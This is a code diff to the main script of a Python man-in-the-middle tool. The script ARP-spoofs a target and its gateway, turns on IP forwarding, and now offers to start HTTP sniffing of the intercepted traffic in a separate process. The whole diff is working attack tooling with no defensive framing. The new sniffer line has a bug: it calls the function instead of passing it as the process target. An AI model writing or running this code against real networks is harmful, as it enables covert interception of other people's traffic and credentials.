@@ -1,15 +1,11 @@
 import argparse
 import time
-import threading
-
-import colorama
-import sys
-
+import multiprocessing
 from colorama import init, Fore
 
 import arp_scan
 import arp_spoof
-import capture
+import sniff
 
 # Initialize colorama for pretty outputs with color!!
 init()
@@ -42,8 +38,6 @@ def spoof(target_ip, gateway_ip):
             # Sleep for a second to prevent a dos
             time.sleep(1)
     except KeyboardInterrupt:
-        # If CTRL + C is pressed, restore
-        print("[!!!] CTRL + C detected. Cleaning up. Please wait.")
         arp_spoof.restore(target_ip, gateway_ip)
         arp_spoof.restore(gateway_ip, target_ip)
 
@@ -64,9 +58,20 @@ def main():
     arp_spoof.enable_ip_routing()
 
     # Start spoofing thread
-    spoofer = threading.Thread(target=spoof, args=(target_ip, gateway_ip,))
-    spoofer.start()
+    try:
+        # Start the spoofing process
+        spoofer = multiprocessing.Process(target=spoof, args=(target_ip, gateway_ip,))
+        spoofer.start()
 
+        # Start HTTP sniffing?
+        will_sniff = input("Would you like to start HTTP sniffing?")
+        if will_sniff.lower() == "y" or will_sniff.lower() == "yes" or will_sniff == "":
+            sniffer = multiprocessing.Process(target=sniff.sniffer_main())
+            sniffer.start()
+
+    except KeyboardInterrupt:
+        arp_spoof.restore(target_ip, gateway_ip)
+        arp_spoof.restore(gateway_ip, target_ip)
 
 
 if __name__ == '__main__':
